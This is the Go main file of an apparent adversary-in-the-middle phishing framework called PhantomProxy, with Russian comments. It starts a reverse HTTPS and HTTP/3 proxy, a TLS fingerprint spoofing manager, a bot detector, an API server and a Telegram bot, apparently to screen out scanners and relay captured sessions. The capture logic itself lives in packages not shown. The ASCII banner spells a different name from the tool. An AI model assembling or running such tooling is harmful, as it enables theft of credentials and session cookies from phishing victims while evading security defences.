package main

import (
	"context"
	"flag"
	"fmt"
	"os"
	"os/signal"
	"syscall"

	"github.com/fatih/color"
	"go.uber.org/zap"
	"go.uber.org/zap/zapcore"

	"github.com/phantom-proxy/phantom-proxy/internal/config"
	"github.com/phantom-proxy/phantom-proxy/internal/database"
	"github.com/phantom-proxy/phantom-proxy/internal/proxy"
	"github.com/phantom-proxy/phantom-proxy/internal/api"
	"github.com/phantom-proxy/phantom-proxy/internal/ml"
	"github.com/phantom-proxy/phantom-proxy/internal/telegram"
	tls_spoof "github.com/phantom-proxy/phantom-proxy/internal/tls"
)

const (
	Version = "1.0.0-dev"
	Banner  = `
██████╗  ██████╗ ██╗     ██╗     ██╗███╗   ██╗ ██████╗ 
██╔══██╗██╔═══██╗██║     ██║     ██║████╗  ██║██╔════╝ 
██████╔╝██║   ██║██║     ██║     ██║██╔██╗ ██║██║  ███╗
██╔═══╝ ██║   ██║██║     ██║     ██║██║╚██╗██║██║   ██║
██║     ╚██████╔╝███████╗███████╗██║██║ ╚████║╚██████╔╝
╚═╝      ╚═════╝ ╚══════╝╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 

PhantomProxy v%s - AitM Framework Next Generation
`
)

func main() {
	// Парсинг аргументов командной строки
	configPath := flag.String("config", "config.yaml", "Путь к конфигурационному файлу")
	debug := flag.Bool("debug", false, "Режим отладки")
	version := flag.Bool("version", false, "Показать версию")
	
	flag.Parse()
	
	if *version {
		fmt.Printf("PhantomProxy v%s\n", Version)
		os.Exit(0)
	}
	
	// Вывод баннера
	color.Cyan(Banner, Version)
	
	// Инициализация логгера
	logger, err := initLogger(*debug)
	if err != nil {
		color.Red("[!] Failed to initialize logger: %v", err)
		os.Exit(1)
	}
	defer logger.Sync()
	
	logger.Info("Starting PhantomProxy...", zap.String("version", Version))
	
	// Загрузка конфигурации
	cfg, err := config.Load(*configPath)
	if err != nil {
		logger.Fatal("Failed to load config", zap.Error(err))
	}
	
	if *debug {
		cfg.Debug = true
	}
	
	logger.Info("Config loaded", 
		zap.String("domain", cfg.Domain),
		zap.Int("https_port", cfg.HTTPSPort),
		zap.Bool("debug", cfg.Debug))
	
	// Инициализация базы данных
	db, err := database.NewDatabase(cfg.DatabasePath)
	if err != nil {
		logger.Fatal("Failed to initialize database", zap.Error(err))
	}
	defer db.Close()
	
	logger.Info("Database initialized", zap.String("path", cfg.DatabasePath))
	
	// Инициализация TLS менеджера
	tlsManager := tls_spoof.NewSpoofManager()
	logger.Info("TLS Spoof Manager initialized")
	
	// Создание HTTP прокси
	httpProxy, err := proxy.NewHTTPProxy(cfg, db, tlsManager, logger)
	if err != nil {
		logger.Fatal("Failed to create HTTP proxy", zap.Error(err))
	}
	
	// Контекст для graceful shutdown
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	
	// Обработка сигналов
	sigChan := make(chan os.Signal, 2)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	
	go func() {
		<-sigChan
		logger.Info("Shutdown signal received")
		cancel()
	}()
	
	// Запуск прокси
	logger.Info("Starting HTTP/HTTPS proxy", 
		zap.String("bind", cfg.BindIP),
		zap.Int("port", cfg.HTTPSPort))
	
	go func() {
		if err := httpProxy.Start(ctx); err != nil {
			logger.Error("HTTP proxy error", zap.Error(err))
		}
	}()
	
	// Запуск API сервера
	if cfg.APIEnabled {
		apiServer := api.NewAPIServer(httpProxy, db, logger, cfg.APIKey)
		
		logger.Info("Starting API server",
			zap.Int("port", cfg.APIPort))
		
		go func() {
			addr := fmt.Sprintf("%s:%d", cfg.BindIP, cfg.APIPort)
			if err := apiServer.Start(addr); err != nil {
				logger.Error("API server error", zap.Error(err))
			}
		}()
	}
	
	// Инициализация ML Bot Detector
	if cfg.MLDetection {
		// ONNX не поддерживает Windows, используем rule-based детектор
		_ = ml.NewRuleBasedDetector(logger, cfg.MLThreshold)
		logger.Info("ML Bot Detector initialized (rule-based)",
			zap.Float32("threshold", cfg.MLThreshold))
	}
	
	// Инициализация Telegram бота
	if cfg.TelegramEnabled && cfg.TelegramToken != "" {
		tgConfig := &telegram.Config{
			Token:   cfg.TelegramToken,
			ChatID:  cfg.TelegramChatID,
			Enabled: true,
		}
		tgBot, err := telegram.NewBot(tgConfig, db, logger)
		if err != nil {
			logger.Error("Failed to initialize Telegram bot", zap.Error(err))
		} else {
			if err := tgBot.Start(ctx); err != nil {
				logger.Error("Telegram bot error", zap.Error(err))
			}
		}
	}
	
	// Запуск HTTP/3 (если включено)
	if cfg.HTTP3Enabled {
		http3Proxy, err := proxy.NewHTTP3Proxy(cfg, db, tlsManager, logger)
		if err != nil {
			logger.Warn("Failed to create HTTP/3 proxy", zap.Error(err))
		} else {
			logger.Info("Starting HTTP/3 QUIC proxy")
			go func() {
				if err := http3Proxy.Start(ctx); err != nil {
					logger.Error("HTTP/3 proxy error", zap.Error(err))
				}
			}()
		}
	}
	
	// Ожидание завершения
	<-ctx.Done()
	
	logger.Info("PhantomProxy stopped")
	color.Green("\n[*] Shutdown complete")
}

func initLogger(debug bool) (*zap.Logger, error) {
	cfg := zap.NewProductionConfig()
	
	if debug {
		cfg.Level = zap.NewAtomicLevelAt(zap.DebugLevel)
		cfg.EncoderConfig.EncodeTime = zapcore.ISO8601TimeEncoder
		cfg.EncoderConfig.EncodeLevel = zapcore.CapitalColorLevelEncoder
	}
	
	return cfg.Build()
}
